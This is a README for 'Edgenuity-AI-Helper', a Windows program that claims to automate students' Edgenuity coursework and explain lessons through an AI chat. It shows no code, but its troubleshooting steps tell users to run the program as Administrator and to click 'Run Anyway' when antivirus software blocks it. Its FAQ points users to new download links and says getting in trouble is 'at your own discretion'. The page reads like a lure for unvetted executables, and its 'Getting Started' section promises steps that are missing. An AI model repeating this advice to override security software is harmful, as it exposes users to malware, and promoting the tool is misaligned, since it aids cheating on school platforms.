## 🛠 Project Overview

Edgenuity-AI-Helper assists students by providing automated tools for Edgenuity coursework. This application integrates an AI chat feature to help users understand complex topics and manages repetitive assignment tasks. The software acts as a productivity aid for students who need extra support navigating online curriculum platforms.

## 📋 Features

*   **AI Chat Integration:** Connects with AI models to explain difficult concepts from your lessons.
*   **Assignment Automation:** Reduces time spent on repetitive tasks within the Edgenuity platform.
*   **User-Friendly Interface:** Provides a simple dashboard for managing settings and tools.
*   **Task Management:** Tracks your progress and helps organize daily learning goals.
*   **Custom Settings:** Allows users to adjust the speed and intensity of automation features.

## ⚙️ System Requirements

To run this application, ensure your computer meets these basic requirements:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 200 megabytes of free space on your hard drive.
*   **Network:** An active internet connection to communicate with the AI model.
*   **Permissions:** Administrative rights to install and run the application.

## 🚀 Getting Started

Once you open the software, you will see a clean dashboard. Follow these steps to configure your account for the first time.

## 🔧 Frequently Asked Questions

**Why does the bot stop working sometimes?**
Edgenuity frequently updates its website. These updates may break the current version of the tool. If you notice the bot stops, check the website for a new download link.

**Does this software work on Mac?**
Currently, this tool supports Windows operating systems only. Using this on a Mac through a virtual machine may result in stability issues.

**What should I do if the AI gives the wrong answer?**
The AI uses patterns to predict answers. If it gives an incorrect response, try rephrasing your question or provide more context from your current lesson.

**Can I get in trouble using this?**
Using automation tools on school platforms depends on your school's specific policies. Use this tool at your own discretion.

## 📝 Troubleshooting

If the application fails to start:

1.  Right-click the application icon and select Run as Administrator.
2.  Ensure your antivirus software is not blocking the application. Some security programs flag new files automatically. Use the "Run Anyway" option if your security software stops the launch.
3.  Restart your computer to clear any locked memory processes.
4.  Uninstall the application, delete the folder from your files, and run the installer again.
5.  Ensure your Windows version is fully updated through the Windows Update settings.
